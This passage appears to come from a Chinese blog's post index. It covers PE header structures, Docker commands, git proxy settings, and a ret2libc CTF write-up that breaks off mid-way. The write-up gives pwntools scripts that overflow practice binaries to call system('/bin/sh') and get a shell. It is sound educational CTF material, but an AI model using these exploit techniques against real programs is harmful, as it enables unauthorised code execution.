对该结构的某些数值改动都可以会造成PE文件的加载或运行失败\nIMAGE_NT_HEADERS这个结构广义上的PE头 在标准PE文件中其大小为456个字节 他是以上两种结构的组好 即\nIMAGE_NT_HEADERS &#x3D; 4个字节的PE标识 + IMAGE_FILE_HEADER+IMAGE_OPTIONAL_HEADER32\n\n该结构的详细定义如下：\ntypedef struct _IMAGE_NT_HEADERS &#123;  DWORD                   Signature;\t\t// PE头标识\t  IMAGE_FILE_HEADER       FileHeader;\t\t// PE标准头  IMAGE_OPTIONAL_HEADER32 OptionalHeader;\t// PE扩展头&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n\n与DOS头一样 PE头开始也是一个标志 用一个双字的 “PE\\0\\0” 来命名 这也是PE头的由来\n数据目录项 IMAGE_DATA_DIRECTORYIMAGE_OPTIONAL_HEADER32(扩展PE头) 结构的最后一个字段为 DataDriectory\n该字段定义了PE文件中出现的所有不同类型的数据和目录信息 如前所述 应用程序中的数据被按照用途分成很多种类 导出表、导入表、资源、重定位等 在内存中，这些数据被操作系统以页为单位组织起来，并赋予不同的访问属性，在文件中，这些数据也同样被组织起来，按照不同类型分别存放在文件的指定位置，该结构就是用来描述这些不同类型的数据在文件(和内存)中位置及大小的\n该数据目录中定义的数据类型一直是16种\nPE种使用了一种称作 “数据目录项 IMAGE_DATA_DIRECTORY” 的数据结构来定义每种数据\n该结构如下所示 只有两个字段\ntypedef struct _IMAGE_DATA_DIRECTORY &#123;  DWORD VirtualAddress;\t\t\t// 数据的起始 RVA  DWORD Size;\t\t\t\t\t// 数据块的长度&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\n\n总的数据目录一共由16个相同的 IMAGE_DATA_DIRECTORY 结构连续排列在一起组成\n\n\n\n\n索引\n名称\n说明\n\n\n\n0\nExport Table\n导出表（程序导出的函数信息）\n\n\n1\nImport Table\n导入表（程序导入的 DLL 和函数）\n\n\n2\nResource Table\n资源表（图标、对话框、字符串等）\n\n\n3\nException Table\n异常处理表（SEH）\n\n\n4\nCertificate Table\n数字签名证书表\n\n\n5\nBase Relocation\n重定位表（Address Fixups）\n\n\n6\nDebug Directory\n调试信息表（符号等）\n\n\n7\nArchitecture\n保留（未使用）\n\n\n8\nGlobalPtr\n全局指针（MIPS）\n\n\n9\nTLS Table\nTLS 初始化数据表（线程本地存储）\n\n\n10\nLoad Config Table\n加载配置表（安全设置等）\n\n\n11\nBound Import\n绑定导入表（提前绑定信息）\n\n\n12\nIAT\n导入地址表（Import Address Table）\n\n\n13\nDelay Import\n延迟导入表（延迟加载 DLL）\n\n\n14\nCOM Descriptor\nCLR 运行时头（托管程序）\n\n\n15\nReserved\n保留\n\n\nIMAGE_OPTIONAL_HEADER├── ...├── IMAGE_DATA_DIRECTORY DataDirectory[16]│   ├── DataDirectory[0]  → Export Table│   ├── DataDirectory[1]  → Import Table│   ├── DataDirectory[2]  → Resource Table│   └── ...\n\n常用的数据目录的用途如下：\n\n\n\n数据目录项\n作用\n\n\n\n导入表\n找到程序依赖的 DLL 和函数\n\n\n导出表\n提供外部调用函数的信息（如 DLL 导出函数）\n\n\n资源表\n程序图标、对话框等 GUI 元素\n\n\n重定位表\n可执行文件在加载时修正地址\n\n\nTLS 表\n多线程支持的线程本地变量数据\n\n\nCOM 描述符\n.NET 程序的入口点（托管程序）\n\n\n如果想在PE文件种寻找特定类型的数据 就需要从该结构开始\n该结构每个字段后的偏移都是基于 IMAGE_NT_HEADERS 头的\n节表项 IMAGE_SECTION_HEADERtypedef struct _IMAGE_SECTION_HEADER &#123;  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];\t\t\t// 8个字节节名  union &#123;    DWORD PhysicalAddress;    DWORD VirtualSize;\t\t\t\t\t\t\t// 节区的尺寸  &#125; Misc;  DWORD VirtualAddress;\t\t\t\t\t\t\t// 节区的RVA地址  DWORD SizeOfRawData;\t\t\t\t\t\t\t// 在文件中对齐后的尺寸  DWORD PointerToRawData;\t\t\t\t\t\t// 在文件中的偏移  DWORD PointerToRelocations;\t\t\t\t\t// 在OBJ文件中使用  DWORD PointerToLinenumbers;\t\t\t\t\t// 行号表的位置(供调试使用)  WORD  NumberOfRelocations;\t\t\t\t\t// 在OBJ文件中使用  WORD  NumberOfLinenumbers;\t\t\t\t\t// 行号表中行号的数量  DWORD Characteristics;\t\t\t\t\t\t// 节的属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n\n该偏移是基于 IMAGE_SECTION_HEADER 头的\nPE头 IMAGE_NT_HEADER 字段\nSignature 双字 PE文件标识 被定义为 4550h 也就是 PE 再加上两个00 这就是PE这个称呼的由 如果更改其中的任何一个字节操作系统就无法把该文件识别为正确的PE文件 通过修改这个字段 会导致PE文件在32为系统中加载失败 但由于文件的其他部分(特别是DOS头)并没有被破坏 系统还是可以识别出其为DOS系统下的可执行程序 并通过调用纯DOS环境来运行 DOS stub中的程序代码 如果你确认操作系统中某个PE文件携带病毒 并且开机会被加载到内存运行 最简单的处理办法是通过WINDOWS PE盘启动系统 在系统中找到病毒文件 使用记事本简单地修改其中任何一个字符 保存文件 重新开机启动后即可防止病毒文件被加载 此PE非彼PE windows PE是一个操作系统 其全称是 Windows Perinstallation Environment 即 Windows的预安装环境 该操作系统区别于 Windows XP&#x2F;2000&#x2F;Vista 等 可以从光盘引导\n\n","tags":["PE"]},{"title":"docker学习","url":"/2025/06/04/docker%E5%AD%A6%E4%B9%A0/","content":"docker打包、分发、部署打包：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包分发：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装部署：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows&#x2F;Mac&#x2F;Linux。\n\n\n镜像加速源\n\n\n镜像加速器\n镜像加速器地址\n\n\n\nDocker 中国官方镜像\nhttps://registry.docker-cn.com\n\n\nDaoCloud 镜像站\nhttp://f1361db2.m.daocloud.io\n\n\nAzure 中国镜像\nhttps://dockerhub.azk8s.cn\n\n\n科大镜像站\nhttps://docker.mirrors.ustc.edu.cn\n\n\n阿里云\nhttps://ud6340vz.mirror.aliyuncs.com\n\n\n七牛云\nhttps://reg-mirror.qiniu.com\n\n\n网易云\nhttps://hub-mirror.c.163.com\n\n\n腾讯云\nhttps://mirror.ccs.tencentyun.com\n\n\n&quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]\n\n软件安装\nhub.docker.com\nDocker 常用命令镜像的管理搜索&#x2F;检索docker search 镜像名称\n\n示例：\n[root@docker ~]# docker search nginxNAME                                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDnginx                                             Official build of Nginx.                        16597     [OK]bitnami/nginx                                     Bitnami nginx Docker Image                      121                  [OK]ubuntu/nginx                                      Nginx, a high-performance reverse proxy &amp; we…   39bitnami/nginx-ingress-controller                  Bitnami Docker Image for NGINX Ingress Contr…   17                   [OK]rancher/nginx-ingress-controller                                                                  10ibmcom/nginx-ingress-controller                   Docker Image for IBM Cloud Private-CE (Commu…   4bitnami/nginx-ldap-auth-daemon                                                                    3bitnami/nginx-exporter                                                                            2circleci/nginx                                    This image is for internal use                  2\n\n默认从 Docker Hub 进行搜索镜像。\n下载&#x2F;拉取docker pull 名称:版本\n\n示例：\n[root@docker ~]# docker pull nginx:1.21.61.21.6: Pulling from library/nginxc229119241af: Pull complete2215908dc0a2: Pull complete08c3cb2073f1: Pull complete18f38162c0ce: Pull complete10e2168f148a: Pull completec4ffe9532b5f: Pull completeDigest: sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Status: Downloaded newer image for nginx:1.21.6docker.io/library/nginx:1.21.6\n\n如果不加版本，则拉取 latest 版本，即最新版本。\n镜像列表docker imagesdocker image ls\n\n示例：\n[root@docker ~]# docker imagesREPOSITORY                                                        TAG       IMAGE ID       CREATED        SIZEnginx                                                             1.21.6    12766a6745ee   10 days ago    142MBrancher/mirrored-flannelcni-flannel                               v0.17.0   9247abf08677   5 weeks ago    59.8MBrancher/mirrored-flannelcni-flannel-cni-plugin                    v1.0.1    ac40ce625740   2 months ago   8.1MBregistry.aliyuncs.com/google_containers/kube-apiserver            v1.23.0   e6bf5ddd4098   4 months ago   135MBregistry.aliyuncs.com/google_containers/kube-controller-manager   v1.23.0   37c6aeb3663b   4 months ago   125MBregistry.aliyuncs.com/google_containers/kube-scheduler            v1.23.0   56c5af1d00b5   4 months ago   53.5MBregistry.aliyuncs.com/google_containers/kube-proxy                v1.23.0   e03484a90585   4 months ago   112MBregistry.aliyuncs.com/google_containers/etcd                      3.5.1-0   25f8c7f3da61   5 months ago   293MBregistry.aliyuncs.com/google_containers/coredns                   v1.8.6    a4ca41631cc7   6 months ago   46.8MBregistry.aliyuncs.com/google_containers/pause                     3.6       6270bb605e12   7 months ago   683kB\n\n五列数据分别代表镜像名称、镜像版本、镜像 ID、拉取时间、镜像大小。\n镜像标签docker tag [imagesID] 改后名称:改后tag\n\n示例：\n[root@docker ~]# docker tag nginx:1.21.6 mynginx:1.21.6[root@docker ~]# docker images |grep nginxmynginx                                                           1.21.6    12766a6745ee   10 days ago    142MBnginx                                                             1.21.6    12766a6745ee   10 days ago    142MB\n\n镜像删除docker rmi 镜像id\n\n示例：\n[root@docker ~]# docker rmi mynginx:1.21.6Untagged: mynginx:1.21.6\n\n镜像导出docker save 镜像id/镜像名 &gt; 名字.tar\n\n示例：\n[root@docker ~]# docker save nginx:1.21.6 &gt; nginx-v1.21.6.tar[root@docker ~]# lsnginx-v1.21.6.tar\n\n镜像导入docker load &lt; 包名\n\n示例：\n[root@docker ~]# docker rmi nginx:1.21.6Untagged: nginx:1.21.6Untagged: nginx@sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Deleted: sha256:12766a6745eea133de9fdcd03ff720fa971fdaf21113d4bc72b417c123b15619Deleted: sha256:3ea962f6f388096ab9798790d363fc6f9c779c924a5eddf5c699d8da080114f7Deleted: sha256:091a2aef7242e42505b69f1ad027d6a442cfce2403e260ac914f0fd6cc2d275fDeleted: sha256:4e72a31f1cd6fd655cc0826c91e886967b6e965e13ac21f31f9f66c27a3b7732Deleted: sha256:e3d1cdf9772a260b3e81a22c1940d63ac45dfe67720f78f00ca73834d9498934Deleted: sha256:af40da71a8618ea9cbcdc333d5e60bd5b6df820f0d07a55f7c9a1c21fd930095Deleted: sha256:608f3a074261105f129d707e4d9ad3d41b5baa94887f092b7c2857f7274a2fce[root@docker ~]# docker load &lt; nginx-v1.21.6.tar608f3a074261: Loading layer [==================================================&gt;]   83.9MB/83.9MBea207a4854e7: Loading layer [==================================================&gt;]     62MB/62MB33cf1b723f65: Loading layer [==================================================&gt;]  3.072kB/3.072kB5c77d760e1f4: Loading layer [==================================================&gt;]  4.096kB/4.096kBfac199a5a1a5: Loading layer [==================================================&gt;]  3.584kB/3.584kBea4bc0cd4a93: Loading layer [==================================================&gt;]  7.168kB/7.168kBLoaded image: nginx:1.21.6[root@docker ~]# docker images |grep nginxnginx                                                             1.21.6    12766a6745ee   10 days ago    142MB\n\n容器的管理创建容器docker run [options] image [command] [arg]\n\nOption 说明：\n\n-d: 后台运行\n-i: 以交互模式运行容器，通常与 -t 同时使用\n-t: 为容器重新分配一个伪输出终端，通常与 -i 同时使用\n--name: 设置容器名字\n--net: 指定网络连接类型\n--h: 设置主机名称\n--dns: 指定容器的 DNS 服务器，默认和宿主一致\n-e: 设置环境变量（&#x3D;””）\n-p: 本地端口:容器端口，把容器的某个端口暴露到主机的某个端口\n-v: 本地目录:容器目录，把主机的某目录挂载到容器的目录里面实现文件系统的链接\n--network: 指定网络\n--rm: 容器关闭后自动删除\n\n示例：使用命令 docker run -p 8080:80 -d --name nginx1 nginx 来运行一个 Nginx 容器，并且把容器的 80 端口暴露到本机的 8080：\n[root@docker ~]# docker run -p 8080:80 -d --name nginx1 nginxUnable to find image &#x27;nginx:latest&#x27; locallylatest: Pulling from library/nginx1fe172e4850f: Pull complete35c195f487df: Pull complete213b9b16f495: Pull completea8172d9e19b9: Pull completef5eee2cb2150: Pull complete93e404ba8667: Pull completeDigest: sha256:859ab6768a6f26a79bc42b231664111317d095a4f04e4b6fe79ce37b3d199097Status: Downloaded newer image for nginx:latest4cf61416ee672b595b99436d0fdcf8ebe5e6d22adaed8838b29e978f19372ecb\n\n容器的创建过程是先到本地查找镜像，如果没有则去 Docker Hub 镜像仓库拉取镜像后再运行。\n容器列表使用命令 docker ps 来查看已经启动的容器，如果有停止运行的容器可以添加 -a 参数来查看：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1\n\n关闭容器使用命令 docker stop &#123;容器ID|容器名称&#125; 来关闭容器：\n[root@docker ~]# docker ps -aCONTAINER ID   IMAGE         COMMAND                  CREATED         STATUS                     PORTS     NAMES4cf61416ee67   nginx         &quot;/docker-entrypoint.…&quot;   6 minutes ago   Exited (0) 4 seconds ago             nginx158e6c5af6efe   hello-world   &quot;/hello&quot;                 12 hours ago    Exited (0) 12 hours ago              great_chatterjee\n\n启动容器使用命令 docker start &#123;容器ID|容器名称&#125; 来开启容器：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   7 minutes ago   Up 6 seconds   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1\n\n重启容器使用命令 docker restart &#123;容器ID|容器名称&#125; 来重启容器。\n进入容器使用命令 docker exec -it &#123;容器ID|容器名称&#125; /bin/sh 来进入容器，/bin/sh 是指定进入容器时用的终端，如果容器内有其他终端可以自行修改：\n[root@docker ~]# docker exec -it nginx1 /bin/sh# exit[root@docker ~]# docker exec -it nginx1 /bin/bashroot@4cf61416ee67:/# lsbin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  varroot@4cf61416ee67:/# exitexit\n\n容器删除使用命令 docker rm &#123;容器ID|容器名称&#125; 来删除已经关闭的容器，如果容器在运行中想要强制删除可以加 -f 参数进行强制删除：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   15 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1[root@docker ~]# docker rm -f nginx1nginx1[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\n\n容器日志使用命令 docker logs &#123;容器ID|容器名称&#125; 来查看容器运行时的日志：\n[root@docker ~]# docker run -p 8081:80 -d --name myweb nginx497eff031c03927f17fe14fcff49bea832403687d580294c42f9cfba697a1564[root@docker ~]# docker logs myweb/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2022/05/02 05:30:57 [notice] 1#1: using the &quot;epoll&quot; event method2022/05/02 05:30:57 [notice] 1#1: nginx/1.21.62022/05/02 05:30:57 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6)2022/05/02 05:30:57 [notice] 1#1: OS: Linux 4.18.0-348.el8.0.2.x86_642022/05/02 05:30:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:10485762022/05/02 05:30:57 [notice] 1#1: start worker processes2022/05/02 05:30:57 [notice] 1#1: start worker process 322022/05/02 05:30:57 [notice] 1#1: start worker process 33\n\n容器转镜像使用命令 docker commit &#123;容器ID|容器名称&#125; 镜像名称 来打包容器，如果容器在运行中可以使用 -p 参数：\n[root@docker ~]# docker commit -p myweb myweb:v1.0sha256:05f5efa5b56fd3d9c6d17b74ee4a3e9866095ac8cc681879dda21b9b7a968859[root@docker ~]# docker imagesREPOSITORY    TAG       IMAGE ID       CREATED         SIZEmyweb         v1.0      05f5efa5b56f   4 seconds ago   142MBnginx         latest    fa5269854a5e   11 days ago     142MBhello-world   latest    feb5d9fea6a5   7 months ago    13.3kB\n\n容器信息使用命令 docker inspect &#123;容器ID|容器名称&#125; 来查看容器的详细信息。这里举例筛选出容器的 IP：\n[root@docker ~]# docker inspect myweb|grep IP            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,            &quot;LinkLocalIPv6PrefixLen&quot;: 0,            &quot;SecondaryIPAddresses&quot;: null,            &quot;SecondaryIPv6Addresses&quot;: null,            &quot;GlobalIPv6Address&quot;: &quot;&quot;,            &quot;GlobalIPv6PrefixLen&quot;: 0,            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,            &quot;IPPrefixLen&quot;: 16,            &quot;IPv6Gateway&quot;: &quot;&quot;,                    &quot;IPAMConfig&quot;: null,                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,                    &quot;IPPrefixLen&quot;: 16,                    &quot;IPv6Gateway&quot;: &quot;&quot;,                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,                    &quot;GlobalIPv6PrefixLen&quot;: 0,\n","tags":["docker"]},{"title":"git设置代理","url":"/2025/05/31/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/","content":"临时设置打开 Git Bash，使用命令临时设定socks代理:\ngit config --global http.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27; git config --global https.proxy &#x27;socks5://127.0.0.1:socks5端口号&#x27;\n\n\n或者http代理：\ngit config --global http.proxy &#x27;http://127.0.0.1:http端口号&#x27; git config --global https.proxy &#x27;https://127.0.0.1:https端口号&#x27;\n\n永久设置若想要设置代理永久生效，则可以把它写入 .gitconfig 文件中。\n使用 vi 打开 .gitconfig 文件：\nvi ~/.gitconfig\n\n写入下列配置(建议在最末写入)：\n[http] proxy = socks5://127.0.0.1:socks5端口号proxy = http://127.0.0.1:http端口号 [https] proxy = socks5://127.0.0.1:socks5端口号proxy = https://127.0.0.1:http端口号\n\n修改后重启 git ，使配置生效：\ngit config -l --global\n\n查看当前代理：\ngit config -l\n\n可以看到自己所配置的端口信息，则说明配置成功。\n原文链接：https://blog.csdn.net/m0_57567093/article/details/127455214\n"},{"title":"pwn-ret2libc","url":"/2025/06/08/pwn-ret2libc/","content":"pwn-ret2libc\n题目简介本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件：\n1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。\n2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。\n另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：\n1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。\n2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。\n3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。\n\n\n解题思路我们的目标是拿到shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。拆分这个目标，可以分为以下两个步骤：\n1.找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。\n2.劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。\n实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和”&#x2F;bin&#x2F;sh”字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和”&#x2F;bin&#x2F;sh”字符串呢？这里需要用到以下公式：\n函数的真实地址   &#x3D;   基地址   +   偏移地址 \n要牢牢记住我们的目标：找到system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。下面我们对这个公式做一个解释：\n偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。\n基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式：\n这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址\n即可求出这次运行的基地址。 \n这回问题又发生了转化：如何找到某个函数func的真实地址呢？\n像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。\n总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。\n整体思路总结（关键）：\n1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。\n2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。\n3.根据libc库的版本可以很容易的确定puts函数的偏移地址。\n4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。\n5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 \n6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。\n7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。\n前置知识（简要了解）plt表和got表这块不用理解太深，读者嫌麻烦也可以直接看后文的解题过程，我这里总结了几位大佬的博客，做个简要介绍。\n由于二进制文件本身没有 system 也没有 &#x2F;bin&#x2F;sh，需要使用 libc 中的 system 和 &#x2F;bin&#x2F;sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc版本，从而知道其他函数的地址。获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址。为什么是已经执行过的函数的地址呢，此处就要介绍plt表和got表的内容了。\ngot表：globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。我们的最终目标就是拿到system函数的got表地址，同时知道libc的基地址的话即可找到system函数的真实地址。\nplt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。\n说的有点绕，用大佬语雀博客中的一图以蔽之：\n可执行的二进制文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址（即最靠右的两个箭头已经建立），但是在一开始（尚未发生函数调用时）就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。\n延迟绑定只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。至于具体过程相对复杂，这里引用大佬博主的图片简要介绍，当程序第一次执行某个函数A时，发生的过程如下：\n在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。当第二次执行函数A时，发生的流程就很简单了，如下图：\n此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一。 \n原文链接：https://blog.csdn.net/Bossfrank/article/details/134872403\n\n例题如下：\nret2libc1\n拿到题目先查属性如图所示\n\n\n\n可以看到首先canary和PIE都没有找到但是开启了 NX 保护 那我们看下是否是静态链接的\n\n\n\n发现是动态链接 那就麻烦了 那我们打开IDA搜下 systeam 函数吧 发现并没有函数调用 但是我们在导入表里面发现到了 system 并且在全局字符串里面找到了 /bin/sh 那就好办了 我们可以去构造payload的了 如下所示\n\nfrom pwn import*p = process(&quot;ret2libc1&quot;)e = ELF(&quot;ret2libc1&quot;)system_adr = e.plt[&#x27;system&#x27;]bs = next(e.search(&quot;/bin/sh&quot;))gdb.attach(p,&quot;b *0x8048689\\nc&quot;)print(hex(system_adr))print(hex(bs))payload = b&#x27;a&#x27;*112 + p32(system_adr) + b&#x27;aaaa&#x27; + p32(bs)p.sendline(payload)p.interactive()\n\n代码解释如下 \n1.首先通过软件的 plt 动态链接表我们可以定位到系统函数&#x27;system&#x27;处2.之后我们在此通过搜索软件的常量字符串拿到 &#x27;/bin/sh&#x27;3.紧接着我们构造的payload原理是这样的 找到溢出点 更改ret的地址 之后 &#x27;构造system函数的栈帧&#x27; 也就是从&#x27;高地址到低地址传递参数、返回值&#x27; 但是我们不在乎他返回到哪里去 因为只要参数传递进去了 他就会执行从而帮我们拿到shell\n\nret2libc2\n先查属性\n\n(Pwn-py312) (base) ➜  ret2libc2 checksec ret2libc2 [*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc2/ret2libc2&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes\n\n\n开启了 NX 看是否是静态编译\n\n(Pwn-py312) (base) ➜  ret2libc2 file ret2libc2 ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n\n\n发现不是 拖到ida我们可以分析出来他有system函数但是没有 /bin/sh 我们只能自已去构造 好消息是有一个 gets 函数 并且我们还在IDA里面发现了一个 buf2 他是基于bss段的 所以我们可以吧 /bin/sh 写到这里面 让我们的 system 函数去执行就可以了 exp如下所示\n\nfrom pwn import*p = process(&quot;ret2libc2&quot;)#gdb.attach(p,&quot;b *0x080486C5\\nc&quot;)sys_adr  = 0x08048490gets_adr = 0x08048460bss_adr  = 0x0804A080pop_ebp  = 0x0804872fpayload = flat(    [&#x27;a&#x27; * 112, gets_adr, pop_ebp, bss_adr, sys_adr, 0xdeadbeef, bss_adr])p.sendline(payload)p.sendline(&#x27;/bin/sh&#x27;)p.interactive()\n\n\nexp 解析如下所示\n\n1.首先我们先从IDA中拿出 &#x27;system&#x27; 的地址 以及 &#x27;gets&#x27; 和 &#x27;bss&#x27;的地址 2.然后我们构造栈内数据 那为什么我们需要一个 &#x27;pop_ebp&#x27; 呢 3.其实主要是 &#x27;pop&#x27; 不在乎 &#x27;pop&#x27; 什么 前提是我们需要构造 &#x27;gets&#x27; 的栈帧 4.但是在构造的过程中我们把 &#x27;bss&#x27; 段的地址写在了栈内 让他当作参数执行 5.我们执行完之后如果不进行pop他就不会把参数弹出栈 6.他就会继续执行 他会以为 &#x27;bss&#x27; 是一个函数地址 7.然后 &#x27;sys_adr&#x27; 是返回值 &#x27;0xdeadbeef&#x27; 是参数 会导致一系列的问题 8.保持栈结构正确，这样才能正常执行 &#x27;system(buf2)&#x27;\n\n\n\nret2libc3\n首先查属性  NX开启\n\n(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc3[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc3&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes\n\n\n查看文件属性 动态编译 32bit\n\n(Pwn-py312) (base) ➜  ret2libc3 file ret2libc3ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n\n\n用ida打开发现有个gets 但是呢没有 system 也没有 /bin/sh 那我们只能去通过libc去计算他的值了 首先我们是本地测试 所以我们直接用一条指令查看他是那个 libc 文件即可\n\n(Pwn-py312) (base) ➜  ret2libc3 ldd 